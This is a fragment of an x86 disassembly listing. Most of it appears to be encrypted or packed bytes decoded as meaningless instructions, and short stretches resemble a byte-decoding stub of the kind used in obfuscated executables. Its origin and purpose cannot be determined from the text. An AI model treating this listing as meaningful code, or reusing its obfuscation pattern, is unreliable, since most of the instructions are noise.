  4038c4:	push   ebx
  4038c5:	mov    al,ds:0x95ce8b8a
  4038ca:	pop    edi
  4038cb:	mov    edx,0xb1dbe14c
  4038d0:	push   edx
  4038d1:	mov    edi,0xd521bc63
  4038d6:	inc    edx
  4038d7:	stc    
  4038d8:	int3   
  4038d9:	adc    al,0xbc
  4038db:	pop    edx
  4038dc:	leave  
  4038dd:	mov    edi,0x3a9eb248
  4038e2:	jae    0x403895
  4038e4:	sbb    BYTE PTR [eax+0x620a473a],cl
  4038ea:	or     dh,BYTE PTR [ecx]
  4038ec:	in     eax,dx
  4038ed:	fsub   QWORD PTR cs:[edi-0x3]
  4038f1:	scas   eax,DWORD PTR es:[edi]
  4038f2:	test   DWORD PTR [esi+0x636607b3],0x7bac61f9
  4038fc:	retf   0x6055
  4038ff:	or     al,0x2e
  403901:	je     0x40397a
  403903:	fistp  DWORD PTR [ebp+0x4f]
  403906:	imul   ebx,DWORD PTR [edx-0x3bc03bdd],0x26
  40390d:	xchg   esp,eax
  40390e:	cs inc esi
  403910:	mov    dl,0xd4
  403912:	cwde   
  403913:	pop    ebp
  403914:	dec    esi
  403915:	dec    ebx
  403916:	and    BYTE PTR [esi-0x309be065],0xb2
  40391d:	cmp    eax,0x302f3ae1
  403922:	cwde   
  403923:	imul   edi,edi,0x3e
  403926:	cld    
  403927:	pop    ss
  403928:	cli    
  403929:	aam    0xcb
  40392b:	and    edx,DWORD PTR ds:0x746a3930
  403931:	push   ecx
  403932:	sub    BYTE PTR [ebx+0x1a],dh
  403935:	add    edi,DWORD PTR [edi-0x6b63d9fc]
  40393b:	jle    0x40392f
  40393d:	int3   
  40393e:	sub    DWORD PTR [ebp-0x2f],esp
  403941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403942:	ins    DWORD PTR es:[edi],dx
  403943:	dec    edx
  403944:	inc    ecx
  403945:	mov    dl,0x12
  403947:	in     al,dx
  403948:	jnp    0x40393e
  40394a:	mov    ds,esp
  40394c:	adc    eax,0x316085dd
  403951:	js     0x4039af
  403953:	xchg   edx,eax
  403954:	mov    al,ds:0x6ff40fea
  403959:	inc    edi
  40395a:	hlt    
  40395b:	les    edi,FWORD PTR [edx-0x10]
  40395e:	and    ecx,DWORD PTR [edi-0x1ae8bf56]
  403964:	repnz call 0x558f:0xfe8a5470
  40396c:	mov    ecx,0xa061af5f
  403971:	aaa    
  403972:	shl    BYTE PTR [ebx-0x6ad86646],0x49
  403979:	jbe    0x40394a
  40397b:	(bad)  
  40397c:	mov    dh,0xc7
  40397e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40397f:	in     eax,dx
  403980:	test   eax,0x930bd9bb
  403985:	and    eax,0xd819a784
  40398a:	shr    BYTE PTR [ebp-0x62bd78c3],0x60
  403991:	mov    edx,DWORD PTR [edi]
  403993:	xor    DWORD PTR [ebp+0x36840fc0],eax
  403999:	add    al,0x0
  40399b:	add    BYTE PTR [ebp-0x977b],cl
  4039a1:	call   DWORD PTR [eax-0x75]
  4039a4:	inc    ebp
  4039a5:	in     al,0x33
  4039a7:	mov    BYTE PTR [ebx],0xc7
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	xor    al,0x2f
  4039d2:	inc    ebx
  4039d3:	(bad)  
  4039d5:	sbb    eax,0x7d6f7e7e
  4039da:	jle    0x403a5a
  4039dc:	call   0x8f4a:0x158391b1
  4039e3:	imul   eax,eax,0x7f
  4039e6:	shl    BYTE PTR [edx+ebp*8+0x1d9ad276],cl
  4039ed:	pop    ebx
  4039ee:	dec    ebp
  4039ef:	lea    edi,[edi+0x45b9a7b9]
  4039f5:	js     0x403978
  4039f7:	adc    BYTE PTR [edx],al
  4039f9:	add    ah,bh
  4039fb:	out    dx,eax
  4039fc:	sub    dh,cl
  4039fe:	data16 add bl,BYTE PTR [ebp+0x2ba3739]
  403a05:	sub    BYTE PTR [ebp+0x6b3c0c1a],dh
  403a0b:	popa   
  403a0c:	call   FWORD PTR [eax]
  403a0e:	lahf   
  403a0f:	jp     0x4039fa
  403a11:	enter  0x230,0xdb
  403a15:	jg     0x403a0b
  403a17:	retf   0x1976
  403a1a:	jg     0x403a5b
  403a1c:	jbe    0x403a19
  403a1e:	(bad)  
  403a1f:	in     eax,dx
  403a20:	cwde   
  403a21:	push   ss
  403a22:	add    cl,ah
  403a24:	add    eax,0x2dc1c906
  403a29:	jno    0x4039cd
  403a2b:	lds    edx,FWORD PTR [ebx-0xa]
  403a2e:	and    BYTE PTR [eax-0x3],ch
  403a31:	dec    ebp
  403a32:	adc    eax,0xe9f965e1
  403a37:	push   edx
  403a38:	adc    BYTE PTR [ecx-0x4230c1bb],0x4d
  403a3f:	mov    ecx,0xc9e080c7
  403a44:	mov    fs,WORD PTR [ecx]
  403a46:	test   BYTE PTR [edi],0x1a
  403a49:	sub    dh,ch
  403a4b:	or     BYTE PTR [edi],ah
  403a4d:	xor    al,0xb8
  403a4f:	dec    edi
  403a50:	xchg   edi,eax
  403a51:	aad    0x3f
  403a53:	lock dec esp
  403a55:	imul   esi,edi,0x72
  403a58:	lods   al,BYTE PTR ds:[esi]
  403a59:	jno    0x403a77
  403a5b:	jmp    0x21b21cef
  403a60:	adc    DWORD PTR [edx+0x42],edx
  403a63:	les    edx,FWORD PTR [ebx]
  403a65:	mov    ds:0x3fbb91b8,eax
  403a6a:	test   eax,0x5e19183d
  403a6f:	imul   edx,DWORD PTR [eax+esi*4],0xffffffc9
  403a73:	xor    al,0xbd
  403a75:	mov    edx,0x96dc3e32
  403a7a:	cmc    
  403a7b:	sub    BYTE PTR [ebx],ah
  403a7d:	xor    dh,BYTE PTR [ebx]
  403a7f:	je     0x403a3a
  403a81:	mov    ds:0x757a273c,eax
  403a86:	jne    0x403ab6
  403a88:	pusha  
  403a89:	pop    ebx
  403a8a:	int3   
  403a8b:	sahf   
  403a8c:	or     eax,0xb16b2e5d
  403a91:	les    edx,FWORD PTR [eax]
  403a93:	test   esp,ecx
  403a95:	mov    ch,0x9d
  403a97:	sub    BYTE PTR [ebx],dh
  403a99:	(bad)  
  403a9a:	push   esi
  403a9b:	retf   0x90b0
  403a9e:	or     DWORD PTR [ebx],esi
  403aa0:	jecxz  0x403abf
  403aa2:	pop    esp
  403aa3:	push   eax
  403aa4:	inc    ebx
  403aa5:	js     0x403b24
  403aa7:	cmp    edx,edx
  403aa9:	sar    BYTE PTR [edi],cl
  403aab:	sub    ecx,ebx
  403aad:	jle    0x403ac1
  403aaf:	stos   BYTE PTR es:[edi],al
  403ab0:	inc    edi
  403ab1:	sbb    BYTE PTR [eax],cl
  403ab3:	sar    BYTE PTR [edi+edx*8],cl
  403ab6:	cmc    
  403ab7:	ins    BYTE PTR es:[edi],dx
  403ab8:	and    eax,0x184df735
  403abd:	dec    edi
  403abe:	xor    eax,0xdb1d3f78
  403ac3:	sub    ch,cl
  403ac5:	jecxz  0x403b16
  403ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ac8:	inc    ebx
  403ac9:	das    
  403aca:	mov    esi,0xc6bb360c
  403acf:	sub    eax,0x561a2fb1
  403ad4:	add    dl,BYTE PTR [eax+eax*2+0x4742e879]
  403adb:	push   esi
  403adc:	aas    
  403add:	pop    ss
  403ade:	stc    
  403adf:	mov    cl,0x2e
  403ae1:	or     eax,0x6a5230d
  403ae6:	mov    dh,0xc7
  403ae8:	mov    al,ds:0x296af5e2
  403aed:	and    BYTE PTR [esi+ebx*1],ch
  403af0:	ficomp DWORD PTR [edx]
  403af2:	mov    dl,0x43
  403af4:	and    DWORD PTR [edi],eax
  403af6:	sbb    esi,ebp
  403af8:	nop
  403af9:	arpl   ax,bx
  403afb:	jo     0x403b3b
  403afd:	int3   
  403afe:	push   esp
  403aff:	lock jne 0x403afb
  403b02:	shr    BYTE PTR [edi-0x1b],1
  403b05:	jo     0x403a9d
  403b07:	pop    edx
  403b08:	ret    0x8c6
  403b0b:	jo     0x403a95
  403b0d:	imul   ebx,esp,0x1a
  403b10:	jge    0x403b38
  403b12:	inc    edi
  403b13:	dec    edi
  403b14:	cwde   
  403b15:	adc    eax,0x17ff8712
  403b1a:	retf   
  403b1b:	or     BYTE PTR [edi+eiz*8],cl
  403b1e:	push   ecx
  403b1f:	xchg   ch,bl
  403b21:	dec    ebp
  403b22:	push   es
  403b23:	mov    cl,0x84
  403b25:	loop   0x403b5a
  403b27:	mov    eax,0xa7c7cc9
  403b2c:	nop
  403b2d:	cmp    al,BYTE PTR [edi+eiz*8]
  403b30:	clc    
  403b31:	mov    dl,0x7a
  403b33:	inc    esp
  403b34:	hlt    
  403b35:	add    DWORD PTR [ecx-0xc],0xe5c6e836
  403b3c:	or     dh,al
  403b3e:	mov    ah,0x88
  403b40:	retf   
  403b41:	in     al,dx
  403b42:	sar    DWORD PTR [ecx-0x22c9969c],0x14
  403b49:	shl    bl,0x5d
  403b4c:	sbb    al,0x82
  403b4e:	jo     0x403ae7
  403b50:	xchg   ebx,eax
  403b51:	ins    BYTE PTR es:[edi],dx
  403b52:	test   BYTE PTR [esi+0x5],cl
  403b55:	aas    
  403b56:	adc    al,0x23
  403b58:	jp     0x403bba
  403b5a:	sar    DWORD PTR [ebx+0x54],0x80
  403b5e:	xor    al,0x76
  403b60:	inc    esi
  403b61:	js     0x403b4e
  403b63:	pop    edx
  403b64:	lods   eax,DWORD PTR ds:[esi]
  403b65:	or     edx,DWORD PTR [edi]
  403b67:	jo     0x403bc6
  403b69:	mov    ds:0x64a208c2,eax
  403b6e:	xchg   edx,eax
  403b6f:	sub    DWORD PTR [edx+0x1fe46ae8],ecx
  403b75:	xchg   ebp,eax
  403b76:	xlat   BYTE PTR ds:[ebx]
  403b77:	aad    0xa8
  403b79:	cmp    bl,BYTE PTR [eax+ebp*4+0x14]
  403b7d:	xlat   BYTE PTR ds:[ebx]
  403b7e:	sbb    cl,BYTE PTR [edi+0x16]
  403b81:	cmp    eax,0x2f7cdd9b
  403b86:	loope  0x403bcd
  403b88:	jmp    0x403bd9
  403b8a:	aam    0x4f
  403b8c:	rcr    ecx,0x16
  403b8f:	jnp    0x403be2
  403b91:	fdivr  DWORD PTR [edx-0x4b0274da]
  403b97:	arpl   si,ax
  403b99:	mov    WORD PTR [ecx-0x18ea1c1e],cs
  403b9f:	mov    BYTE PTR [ecx],ch
  403ba1:	jno    0x403b4f
  403ba3:	xor    BYTE PTR [ecx],dh
  403ba5:	into   
  403ba6:	jnp    0x403b8d
  403ba8:	dec    ebp
  403ba9:	inc    ecx
  403baa:	push   eax
  403bab:	pop    edx
  403bac:	mov    edi,0x11591958
  403bb1:	inc    ecx
  403bb2:	cld    
  403bb3:	or     DWORD PTR [esi],esp
  403bb5:	test   eax,0xe1223b4a
  403bba:	mov    ds:0xeef89464,al
  403bbf:	push   eax
  403bc0:	mov    eax,0xf70663ca
  403bc5:	aam    0x83
  403bc7:	in     al,0xb0
  403bc9:	mov    bh,0x93
  403bcb:	int    0x7c
  403bcd:	stos   DWORD PTR es:[edi],eax
  403bce:	mov    BYTE PTR [esi-0x7e685d1a],bl
  403bd4:	in     eax,0x7d
  403bd6:	popf   
  403bd7:	xor    ah,BYTE PTR [ecx-0x13]
  403bda:	jl     0x403b75
  403bdc:	or     cl,dl
  403bde:	int    0x78
  403be0:	pop    esi
  403be1:	sub    bl,ah
  403be3:	mov    BYTE PTR [ebp-0x6967ead3],dl
  403be9:	inc    ecx
  403bea:	push   es
  403beb:	cmp    dl,BYTE PTR [edi]
  403bed:	lea    esi,[edx]
  403bef:	mov    eax,0x883c2c75
  403bf4:	int    0x94
  403bf6:	mov    es,WORD PTR [edi-0x51d95681]
  403bfc:	mov    al,ds:0xd1d9fd34
  403c01:	and    DWORD PTR [edx+edi*4],0xa25c4fe8
  403c08:	or     esp,DWORD PTR [ebx-0x7e26dce4]
  403c0e:	mov    esi,?
  403c10:	jmp    0x3e6cc581
  403c15:	fldpi  
  403c17:	into   
  403c18:	int3   
  403c19:	dec    eax
  403c1a:	dec    ebx
  403c1b:	push   edx
  403c1c:	dec    eax
  403c1d:	cld    
  403c1e:	repz mov ds:0xb6b438da,eax
  403c24:	push   ds
  403c25:	out    dx,al
  403c26:	lods   al,BYTE PTR ds:[esi]
  403c27:	pop    ecx
  403c28:	imul   ecx,eax,0x2f
  403c2b:	outs   dx,DWORD PTR ds:[esi]
  403c2c:	lea    edi,[ebx-0x70]
  403c2f:	push   edi
  403c30:	fbld   TBYTE PTR [ebx-0x45]
  403c33:	xchg   DWORD PTR [eax-0x392098d8],ebp
  403c39:	in     eax,0x44
  403c3b:	add    DWORD PTR [esi],ebp
  403c3d:	mov    edx,0x5e6b5ea
  403c42:	cld    
  403c43:	jmp    0x4c3d6f7a
  403c48:	stos   DWORD PTR es:[edi],eax
  403c49:	adc    ebp,ebp
  403c4b:	lods   eax,DWORD PTR ds:[esi]
  403c4c:	pop    ebx
  403c4d:	out    0xa7,al
  403c4f:	pop    ds
  403c50:	adc    esp,DWORD PTR [edx]
  403c52:	pop    eax
  403c53:	dec    edi
  403c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c55:	outs   dx,BYTE PTR ds:[esi]
  403c56:	pop    ebx
  403c57:	jns    0x403cad
  403c59:	xchg   DWORD PTR [ecx+0x2176c1d2],esp
  403c5f:	push   ebx
  403c60:	mov    DWORD PTR [ebp-0x231ab24c],esi
  403c66:	add    ch,BYTE PTR [ebx+0x55]
  403c69:	ret    
  403c6a:	mov    bh,0x90
  403c6c:	jo     0x403cca
  403c6e:	cmp    edi,DWORD PTR [edi]
  403c70:	stc    
  403c71:	and    eax,0x14dbc792
  403c76:	cs ret 0xe421
  403c7a:	jecxz  0x403c52
  403c7c:	or     BYTE PTR [edx-0x7e],ah
  403c7f:	repz mov bl,0xa6
  403c82:	popa   
  403c83:	mov    cl,0xc3
  403c85:	ins    BYTE PTR es:[edi],dx
  403c86:	cmp    al,0xc8
  403c88:	adc    al,0xcd
  403c8a:	pop    edx
  403c8b:	sbb    edi,esp
  403c8d:	lea    esp,[ebx]
  403c8f:	jmp    0x403cfc
  403c91:	mov    esi,DWORD PTR [edx-0xd]
  403c94:	cmp    dh,al
  403c96:	adc    bh,BYTE PTR [edi]
  403c98:	pop    ds
  403c99:	popa   
  403c9a:	jmp    0xbc8eca0e
  403c9f:	mov    ebp,0xd30fc920
  403ca4:	dec    ebp
  403ca5:	cs push cs
  403ca7:	inc    ecx
  403ca8:	icebp  
  403ca9:	jno    0x403cfb
  403cab:	cmp    ecx,edi
  403cad:	push   ebp
  403cae:	dec    ebx
  403caf:	push   cs
  403cb0:	out    0xa,eax
  403cb2:	mov    esp,0x36459fb9
  403cb7:	fcomp  st(3)
  403cb9:	outs   dx,DWORD PTR ds:[esi]
  403cba:	sbb    edi,0x46937f74
  403cc0:	stos   BYTE PTR es:[edi],al
  403cc1:	stos   DWORD PTR es:[edi],eax
  403cc2:	mov    al,0xfc
  403cc4:	pop    ds
  403cc5:	out    dx,al
  403cc6:	pop    ds
  403cc7:	fucom  st(3)
  403cc9:	jb     0x403d1f
  403ccb:	inc    esi
  403ccc:	pop    esi
  403ccd:	xchg   esi,eax
  403ccf:	jmp    0xa284:0xdfb716ae
  403cd6:	rcr    DWORD PTR [ebp+0x34],1
  403cd9:	mul    BYTE PTR [edi]
  403cdb:	test   eax,0xd6d1ecea
  403ce0:	add    al,0x9f
  403ce2:	(bad)  
  403ce3:	mov    ebx,0x84f0cd57
  403ce8:	retf   
  403ce9:	js     0x403c7e
  403ceb:	push   ebx
  403cec:	pop    ebp
  403ced:	dec    esp
  403cee:	sbb    eax,0x7b6f9224
  403cf3:	rcl    dl,0x27
  403cf6:	(bad)  
  403cf7:	xchg   edx,eax
  403cf8:	push   esp
  403cf9:	adc    ecx,esp
  403cfb:	mov    ss,WORD PTR [esi-0x1b673298]
  403d01:	sub    BYTE PTR [eax],cl
  403d03:	(bad)  
  403d04:	dec    eax
  403d05:	call   0x5538:0xad5b462f
  403d0c:	add    al,0x8e
  403d0e:	cmc    
  403d0f:	test   al,0x5b
  403d11:	adc    dl,BYTE PTR [edi-0x47]
  403d14:	mov    cl,0x65
  403d16:	sbb    BYTE PTR [ecx-0x50],bl
  403d19:	xlat   BYTE PTR ds:[ebx]
  403d1a:	mov    edx,0xfc2dc20e
  403d1f:	outs   dx,BYTE PTR ds:[esi]
  403d20:	push   ecx
  403d21:	je     0x403d76
  403d23:	and    eax,0xa6784364
  403d28:	or     bl,cl
  403d2a:	sub    cl,al
  403d2c:	gs pop esi
  403d2e:	stos   BYTE PTR es:[edi],al
  403d2f:	or     ch,BYTE PTR [eax-0xb3e3f95]
  403d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d36:	outs   dx,BYTE PTR ds:[esi]
  403d37:	lods   eax,DWORD PTR ds:[esi]
  403d38:	push   ebp
  403d39:	sbb    ch,BYTE PTR [edi+0x5]
  403d3c:	mov    edi,0xcc5247a4
  403d41:	leave  
  403d42:	push   0x6d
  403d44:	jo     0x403d1a
  403d46:	dec    ecx
  403d47:	inc    ebx
  403d48:	mov    edi,esi
  403d4a:	ds jecxz 0x403d02
  403d4d:	popa   
  403d4e:	cmp    cl,BYTE PTR [esi-0x49]
  403d51:	outs   dx,DWORD PTR ds:[esi]
  403d52:	out    dx,al
  403d53:	pop    ebx
  403d54:	aam    0x6b
  403d56:	mov    cl,0xae
  403d58:	cmc    
  403d59:	je     0x403ce6
  403d5b:	sbb    BYTE PTR [edx],dl
  403d5d:	push   eax
  403d5e:	fcom   DWORD PTR [edi+0x5c]
  403d61:	and    al,ch
  403d63:	mov    ebp,0xb902bd81
  403d68:	pop    esi
  403d69:	xchg   ebp,eax
  403d6a:	hlt    
  403d6b:	loope  0x403d12
  403d6d:	mov    dh,BYTE PTR [esi]
  403d6f:	or     eax,0xa7853624
  403d74:	mov    cl,0x7a
  403d76:	in     eax,0x17
  403d78:	mov    bh,al
  403d7a:	nop
  403d7b:	inc    ebp
  403d7c:	(bad)  
  403d7d:	sahf   
  403d7e:	xchg   esp,eax
  403d7f:	fdiv   DWORD PTR [ecx]
  403d81:	fimul  WORD PTR [esi+ebx*1]
  403d84:	packuswb mm6,QWORD PTR [eax+0x32009e8]
  403d8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d8c:	leave  
  403d8d:	icebp  
  403d8e:	stos   BYTE PTR es:[edi],al
  403d8f:	pop    esp
  403d90:	pcmpeqw mm0,QWORD PTR [ecx+eax*8-0x6f7a9283]
  403d98:	add    eax,ebp
  403d9a:	sub    ebp,DWORD PTR [edi+0x7f]
  403d9d:	(bad)  
  403d9e:	xlat   BYTE PTR ds:[ebx]
  403d9f:	ret    0x4df2
  403da2:	enter  0x6062,0x9
  403da6:	or     DWORD PTR [eax-0x74c059ea],0x7c2c266d
  403db0:	arpl   WORD PTR [ecx+0x5894925e],sp
  403db6:	adc    BYTE PTR [ebx],dh
  403db8:	mov    ds:0xf2326315,al
  403dbd:	mov    bx,0x49b1
  403dc1:	pushf  
  403dc2:	and    eax,0x5dbcb81b
  403dc7:	mov    ebp,0xbb013df1
  403dcc:	repz call 0x40c099
  403dd2:	mov    ecx,DWORD PTR [ebp-0x28]
  403dd5:	xor    ecx,esi
  403dd7:	mov    eax,0xffcd8d65
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    DWORD PTR [ebp-0x1b5fa75c],ebx
  403e17:	sbb    DWORD PTR [esi+0x7e],edi
  403e1a:	outs   dx,DWORD PTR ds:[esi]
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403dd8
  403e1f:	xchg   DWORD PTR [ebx],eax
  403e21:	xchg   BYTE PTR [edi-0x1674e729],bl
  403e27:	pusha  
  403e28:	xchg   ebp,eax
  403e29:	gs mov eax,ss:0x6b089f68
  403e30:	aaa    
  403e31:	inc    esp
  403e32:	dec    esi
  403e33:	fild   DWORD PTR ss:[eax-0x67e7114]
  403e3a:	dec    ebx
  403e3b:	push   cs
  403e3c:	mov    edi,0x28b250f3
  403e41:	push   ebx
  403e42:	dec    ebx
  403e43:	cmp    eax,0x9cc566f1
  403e48:	or     DWORD PTR [ebx],esp
  403e4a:	dec    esi
  403e4b:	xchg   esi,eax
  403e4c:	icebp  
  403e4d:	nop
  403e4e:	fcompp 
  403e50:	push   edx
  403e51:	push   0xd740aad0
  403e56:	add    ecx,DWORD PTR [esi]
  403e58:	xlat   BYTE PTR ds:[ebx]
  403e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e5a:	mov    ecx,0xc23d47ef
  403e5f:	nop
  403e60:	xchg   edi,eax
  403e61:	sbb    edx,ebp
  403e63:	sbb    al,0x96
  403e65:	cmp    eax,0xa1599b40
  403e6a:	cli    
  403e6b:	addr16 or al,dh
  403e6e:	mov    bh,cl
  403e70:	out    dx,eax
  403e71:	icebp  
  403e72:	into   
  403e73:	stos   BYTE PTR es:[edi],al
  403e74:	push   es
  403e75:	xor    eax,0xd677f95a
  403e7a:	xchg   esi,eax
  403e7b:	les    eax,FWORD PTR [esp+ebp*2]
  403e7e:	mov    eax,0x445dd87f
  403e83:	push   ss
  403e84:	or     eax,DWORD PTR [eax-0xd34ce66]
  403e8a:	and    eax,0xb67bba21
  403e8f:	sbb    edi,DWORD PTR [ebx-0x54d5cbf]
  403e95:	push   ecx
  403e96:	inc    edx
  403e97:	ret    0x4364
  403e9a:	dec    esp
  403e9b:	adc    DWORD PTR [eax+0x1e6b59b1],ebx
  403ea1:	xor    eax,0x40526e38
  403ea6:	mov    WORD PTR ds:0xb62ab2d0,fs
  403eac:	fsub   DWORD PTR [ecx]
  403eae:	fbld   TBYTE PTR [eax]
  403eb0:	mul    BYTE PTR [eax]
  403eb2:	sti    
  403eb3:	das    
  403eb4:	sub    al,0xbb
  403eb6:	out    dx,eax
  403eb7:	imul   ecx,DWORD PTR [esi],0x67
  403eba:	pop    esi
  403ebb:	(bad)  
  403ebc:	movaps xmm2,xmm2
  403ebf:	pop    es
  403ec0:	das    
  403ec1:	cmp    eax,0xed944a2a
  403ec6:	mov    eax,0xb95b150e
  403ecb:	inc    esp
  403ecc:	and    BYTE PTR [esi-0xcbaf0c4],al
  403ed2:	sub    BYTE PTR [ebp-0x77],al
  403ed5:	jge    0x403ec6
  403ed7:	jns    0x403f1a
  403ed9:	fst    DWORD PTR [esi+0x78]
  403edc:	cwde   
  403edd:	(bad)  
  403edf:	adc    DWORD PTR fs:[eax],ebp
  403ee2:	not    DWORD PTR [eax+0x5625bfe6]
  403ee8:	clc    
  403ee9:	shl    eax,cl
  403eeb:	pop    esi
  403eec:	pop    bp
  403eee:	jl     0x403e7b
  403ef0:	int    0x5
  403ef2:	xor    BYTE PTR [ebx],ah
  403ef4:	inc    edi
  403ef5:	inc    eax
  403ef6:	adc    dh,BYTE PTR [esi+0x63]
  403ef9:	sti    
  403efa:	(bad)
  403efe:	imul   esp,DWORD PTR [eax+0xf],0xffffffe2
  403f02:	adc    BYTE PTR [ebx],ch
  403f04:	and    al,0xc6
  403f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f07:	jb     0x403f03
  403f09:	mov    al,ds:0x7aa98bff
  403f0e:	int3   
  403f0f:	(bad)  
  403f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f11:	add    BYTE PTR [esi-0x7cc24e7],dl
  403f17:	or     DWORD PTR ss:[ebx+edi*8],0x47
  403f1c:	fmulp  st(1),st
  403f1e:	retf   0x1d2c
  403f21:	xchg   DWORD PTR [ebx+0x6c3dbe8a],eax
  403f27:	(bad)  
  403f28:	retf   
  403f29:	pop    esp
  403f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f2b:	ds out 0x8,al
  403f2e:	sbb    eax,0x8f0be138
  403f33:	bound  edx,QWORD PTR [esi+0x261d51ff]
  403f39:	dec    esi
  403f3a:	and    al,0x56
  403f3c:	pop    esp
  403f3d:	int3   
  403f3e:	ins    DWORD PTR es:[edi],dx
  403f3f:	xchg   ecx,eax
  403f40:	jp     0x403f59
  403f42:	sub    al,0xc5
  403f44:	adc    eax,0x13866af7
  403f49:	pop    esi
  403f4a:	aad    0x46
  403f4c:	cwde   
  403f4d:	pop    ds
  403f4e:	lods   al,BYTE PTR ds:[esi]
  403f4f:	call   0xb343ad62
  403f54:	in     al,dx
  403f55:	neg    DWORD PTR [ebp-0x270de583]
  403f5b:	sub    eax,0x6254e4c0
  403f60:	push   cs
  403f61:	std    
  403f62:	dec    ebp
  403f63:	push   DWORD PTR [ecx+edi*2]
  403f66:	repnz or DWORD PTR [eax+0x16490257],esi
  403f6d:	jo     0x403f0a
  403f6f:	fidivr DWORD PTR [ecx+ebx*4-0x28]
  403f73:	sbb    DWORD PTR [ebx+0xa3f8876],esp
  403f79:	mov    dh,BYTE PTR [ebp-0x6b]
  403f7c:	pushf  
  403f7d:	es mov cl,0x72
  403f80:	and    eax,0xb2d484a9
  403f85:	fdiv   DWORD PTR [esi]
  403f87:	mov    ah,0x1c
  403f89:	dec    edi
  403f8a:	mov    ch,0xf6
  403f8c:	pop    ebx
  403f8d:	and    dh,BYTE PTR [ebx-0x518f568e]
  403f93:	cli    
  403f94:	imul   bh
  403f96:	mov    ds:0x43e09ce3,eax
  403f9b:	imul   edx,DWORD PTR [ebx-0x1f],0x9e9c147a
  403fa2:	xchg   edx,eax
  403fa3:	cld    
  403fa4:	stos   BYTE PTR es:[edi],al
  403fa5:	jp     0x404012
  403fa7:	pop    ebp
  403fa8:	leave  
  403fa9:	out    dx,eax
  403faa:	adc    eax,0xa5326a21
  403faf:	mov    al,ds:0xaa26af1c
  403fb4:	mov    ecx,0xccf67c3
  403fb9:	push   esp
  403fba:	stos   BYTE PTR es:[edi],al
  403fbb:	in     eax,dx
  403fbc:	xchg   ecx,eax
  403fbd:	xor    BYTE PTR [ebp+0x7e],dh
  403fc0:	rcl    edi,cl
  403fc2:	stc    
  403fc3:	push   ss
  403fc4:	aam    0x76
  403fc6:	adc    ecx,DWORD PTR [eax+ebp*2-0x28b4fe13]
  403fcd:	lea    esp,[ebx+ebp*8]
  403fd0:	in     al,dx
  403fd1:	mov    edx,0xb2b1733c
  403fd6:	iret   
  403fd7:	xor    esp,DWORD PTR [ebp-0x11]
  403fda:	or     al,0xe4
  403fdc:	xchg   esp,eax
  403fdd:	fcomp  st(7)
  403fdf:	sbb    bh,ah
  403fe1:	add    esp,DWORD PTR ds:0x53cedcbe
  403fe7:	jp     0x40405e
  403fe9:	adc    edx,edi
  403feb:	and    al,0xf5
  403fed:	mov    edx,0x93523066
  403ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ff4:	sar    BYTE PTR [eax],cl
  403ff6:	push   cs
  403ff7:	fist   DWORD PTR [esi]
  403ff9:	fcmovb st,st(5)
  403ffb:	add    DWORD PTR [edx],0x20
  403ffe:	pop    edx
  403fff:	jno    0x403f98
  404001:	test   ebp,edx
  404003:	jge    0x40407b
  404005:	push   cs
  404006:	into   
  404007:	fcmove st,st(3)
  404009:	out    dx,al
  40400a:	push   ds
  40400b:	add    al,dl
  40400d:	out    0x92,eax
  40400f:	mov    ds:0x5bee06a,eax
  404014:	mov    ds:0xa5d2d675,al
  404019:	and    ebx,edi
  40401b:	sar    ch,1
  40401d:	cdq    
  40401e:	enter  0x34d5,0x77
  404022:	jns    0x403fd8
  404024:	push   ds
  404025:	div    edi
  404027:	mov    ah,ah
  404029:	sbb    al,0x18
  40402b:	fiadd  DWORD PTR [ecx]
  40402d:	mov    eax,0x895e1644
  404032:	cld    
  404033:	inc    ebp
  404034:	adc    DWORD PTR [ecx-0xf],esp
  404037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404038:	sbb    ah,BYTE PTR [edx-0x5b]
  40403b:	hlt    
  40403c:	daa    
  40403d:	mov    ecx,0xbd771228
  404042:	mov    eax,0x7aaaddd2
  404047:	fidiv  DWORD PTR [ebx+0x4]
  40404a:	xchg   eax,ebx
  40404c:	aas    
  40404d:	dec    ebp
  40404e:	xchg   esi,eax
  40404f:	ja     0x403fff
  404051:	fidivr DWORD PTR [eax-0x520e4c3c]
  404057:	fmul   st,st(1)
  404059:	add    eax,0x3d89a8fb
  40405e:	in     eax,dx
